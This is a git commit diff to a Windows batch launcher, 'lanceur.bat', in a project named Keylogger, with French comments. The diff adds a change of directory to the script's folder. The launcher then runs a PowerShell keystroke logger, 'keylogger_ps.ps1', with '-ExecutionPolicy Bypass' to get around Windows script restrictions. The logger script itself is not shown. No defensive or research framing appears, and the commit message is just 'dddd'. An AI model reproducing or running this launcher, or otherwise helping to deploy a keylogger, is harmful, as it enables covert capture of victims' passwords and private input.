4638b9d40f09a62fdec2692651b3682178fe4607
Nadouillebk <122603946+Nadouillebk@users.noreply.github.com>
2025-11-26 15:20:55 +0100

    dddd

--- Keylogger/lanceur.bat
+++ Keylogger/lanceur.bat
@@ -2,11 +2,16 @@
 title Keylogger Démarrage
 color 0A
 
+:: Déplace l'invite de commande dans le répertoire du script Batch
+cd /d "%~dp0"
+
 echo [1] Démarrage du Keylogger natif PowerShell...
 echo [2] Veuillez autoriser l'execution du script si Windows le demande.
 echo.
 
-:: Lancement du script PowerShell avec politique de contournement
+:: Lancement du script PowerShell : 
+:: - Argument -ExecutionPolicy Bypass pour autoriser le script
+:: - Utilise le chemin RELATIF du fichier (qui est maintenant valide grace au 'cd /d')
 powershell.exe -ExecutionPolicy Bypass -File keylogger_ps.ps1
 
 pause
